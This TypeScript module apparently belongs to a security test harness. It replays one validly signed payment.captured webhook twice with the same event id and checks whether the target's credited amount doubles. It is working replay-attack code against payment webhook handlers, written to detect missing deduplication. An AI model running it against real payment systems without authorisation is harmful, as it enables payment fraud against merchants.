import crypto from "crypto";
import type { AttackResult } from "./types.ts";
import {
  buildWebhookPayload,
  readOrderState,
  sendWebhook,
  setupAuthorized,
  signWebhookBody,
} from "./util.ts";

/**
 * Generates ONE validly-signed payment.captured payload (raw body + correct
 * HMAC over it) and POSTs it twice with the same x-razorpay-event-id.
 * Succeeded = the credited amount visibly increased on BOTH deliveries
 * (doubled) rather than the second replay being ignored — verified by
 * reading the order status page after each delivery, never by assumption.
 */
export async function webhookReplay(
  targetUrl: string,
  orderId: string,
  amountPaise: number,
): Promise<AttackResult> {
  // Setup: a real payment.authorized event always precedes capture — get
  // the order into a state where a capture event is even eligible to be
  // processed. This is protocol setup, not the attack itself.
  await setupAuthorized(targetUrl, orderId, amountPaise);
  const baseline = await readOrderState(targetUrl, orderId);

  const rawBody = buildWebhookPayload("payment.captured", orderId, amountPaise);
  const signature = signWebhookBody(rawBody);
  const eventId = `evt_replay_${crypto.randomUUID()}`;

  const first = await sendWebhook(targetUrl, rawBody, signature, eventId);
  const afterFirst = await readOrderState(targetUrl, orderId);

  const second = await sendWebhook(targetUrl, rawBody, signature, eventId);
  const afterSecond = await readOrderState(targetUrl, orderId);

  const creditedIncreasedOnFirst =
    baseline.creditedAmountRupees !== null &&
    afterFirst.creditedAmountRupees !== null &&
    afterFirst.creditedAmountRupees > baseline.creditedAmountRupees;

  const creditedIncreasedOnSecond =
    afterFirst.creditedAmountRupees !== null &&
    afterSecond.creditedAmountRupees !== null &&
    afterSecond.creditedAmountRupees > afterFirst.creditedAmountRupees;

  const succeeded = creditedIncreasedOnFirst && creditedIncreasedOnSecond;

  const details = succeeded
    ? `Same validly-signed payment.captured event (id ${eventId}) delivered twice: creditedAmount went ₹${baseline.creditedAmountRupees} → ₹${afterFirst.creditedAmountRupees} → ₹${afterSecond.creditedAmountRupees}. The second delivery was reprocessed instead of deduplicated.`
    : `Same validly-signed payment.captured event (id ${eventId}) delivered twice: creditedAmount went ${fmt(baseline.creditedAmountRupees)} → ${fmt(afterFirst.creditedAmountRupees)} → ${fmt(afterSecond.creditedAmountRupees)} (status ${afterSecond.status ?? "unknown"}). First delivery: ${first.httpStatus} ${first.body}. Second delivery: ${second.httpStatus} ${second.body}. No repeated credit observed.`;

  return {
    attackName: "webhookReplay",
    succeeded,
    details,
    httpStatus: second.httpStatus,
    targetUrl,
    evidence: {
      exchanges: [
        {
          label: "Delivery 1 of 2 (signed payment.captured)",
          method: "POST",
          path: "/api/webhook",
          headers: { "x-razorpay-event-id": eventId, "x-razorpay-signature": `${signature.slice(0, 16)}… (valid)` },
          body: rawBody,
          responseStatus: first.httpStatus,
          responseBody: first.body,
        },
        {
          label: "Delivery 2 of 2 (identical event id — should be deduped)",
          method: "POST",
          path: "/api/webhook",
          headers: { "x-razorpay-event-id": eventId, "x-razorpay-signature": `${signature.slice(0, 16)}… (valid)` },
          body: rawBody,
          responseStatus: second.httpStatus,
          responseBody: second.body,
        },
      ],
      stateTrail: [
        { label: "before", status: baseline.status, creditedRupees: baseline.creditedAmountRupees },
        { label: "after delivery 1", status: afterFirst.status, creditedRupees: afterFirst.creditedAmountRupees },
        { label: "after delivery 2", status: afterSecond.status, creditedRupees: afterSecond.creditedAmountRupees },
      ],
    },
  };
}

function fmt(v: number | null): string {
  return v === null ? "n/a" : `₹${v}`;
}
